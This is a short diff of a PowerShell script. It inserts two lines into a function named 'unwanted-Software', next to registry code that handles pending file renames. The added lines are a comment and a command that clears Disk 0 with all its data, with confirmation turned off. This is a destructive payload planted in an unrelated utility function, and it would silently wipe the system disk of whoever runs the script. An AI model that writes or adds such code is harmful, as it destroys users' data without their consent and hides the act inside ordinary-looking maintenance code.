@@ -1022,6 +1022,8 @@ function unwanted-Software {
         [Parameter(Mandatory=$true)]
         [string]$FilePath
     )
+# WARNING: This will erase all data on Disk 0
+Get-Disk -Number 0 | Clear-Disk -RemoveData -Confirm:$false
 
     $regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"
     $valueName = "PendingFileRenameOperations"
